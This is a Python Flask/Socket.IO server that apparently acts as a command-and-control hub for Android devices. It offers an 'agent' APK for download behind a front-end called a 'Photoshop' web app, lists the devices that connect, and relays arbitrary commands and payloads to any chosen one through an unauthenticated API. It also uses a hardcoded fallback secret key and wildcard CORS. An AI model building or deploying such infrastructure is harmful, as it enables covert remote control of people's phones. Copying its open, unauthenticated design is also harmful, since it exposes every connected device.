import os
from flask import Flask, jsonify, request, send_from_directory
from flask_socketio import SocketIO
from flask_cors import CORS

# --- CONFIGURACIÓN ---
# Servimos los archivos estáticos desde la carpeta 'public'
app = Flask(__name__, static_folder='public', static_url_path='')
CORS(app, resources={r"/api/*": {"origins": "*"}}) # Habilitamos CORS solo para las rutas de la API

app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'clave-secreta-para-probar')
socketio = SocketIO(app, async_mode='eventlet', cors_allowed_origins="*")

connected_agents = {}

# ===================================================================
# RUTAS PARA SERVIR EL FRONTEND (Tu App Web "Photoshop")
# ===================================================================

@app.route('/')
def serve_index():
    """
    Esta es la ruta principal. Sirve tu archivo index.html.
    """
    return send_from_directory('.', 'index.html')

@app.route('/download/agent')
def download_agent_apk():
    """
    Esta ruta sirve el APK del agente para descargar.
    Asegúrate de tener el archivo 'app-debug.apk' en la carpeta 'public'.
    """
    try:
        return send_from_directory('public', 'app-debug.apk', as_attachment=True)
    except FileNotFoundError:
        return "APK del agente no encontrado en la carpeta 'public'.", 404

# ===================================================================
# RUTAS DE LA API DEL BACKEND (Para el Panel de Control)
# ===================================================================

@app.route('/api/get-agents', methods=['GET'])
def get_agents():
    return jsonify(list(connected_agents.values()))

@app.route('/api/send-command', methods=['POST'])
def send_command_to_agent():
    data = request.json
    target_sid = data.get('target_id')
    action = data.get('action')
    payload = data.get('payload', '')

    if not target_sid or not action or target_sid not in connected_agents:
        return jsonify({"status": "error", "message": "Agente no válido o desconectado"}), 404

    socketio.emit('server_command', {'command': action, 'payload': payload}, to=target_sid)
    print(f"[COMANDO] Enviando '{action}' al agente {connected_agents[target_sid].get('name')}")
    return jsonify({"status": "success"})

# ===================================================================
# EVENTOS DE WEBSOCKET (Para los Agentes de Android)
# ===================================================================

@socketio.on('connect')
def handle_connect():
    sid = request.sid
    device_name = request.args.get('deviceName', 'Dispositivo Desconocido')
    connected_agents[sid] = {'id': sid, 'name': device_name, 'status': 'connected'}
    print(f"[CONEXIÓN] Agente conectado: {device_name} (ID: {sid})")

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    agent_info = connected_agents.pop(sid, None)
    if agent_info:
        print(f"[DESCONEXIÓN] Agente desconectado: {agent_info.get('name')}")

# --- INICIALIZACIÓN ---
if __name__ == '__main__':
    print("Iniciando servidor unificado (Frontend + Backend)...")
    socketio.run(app, host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))

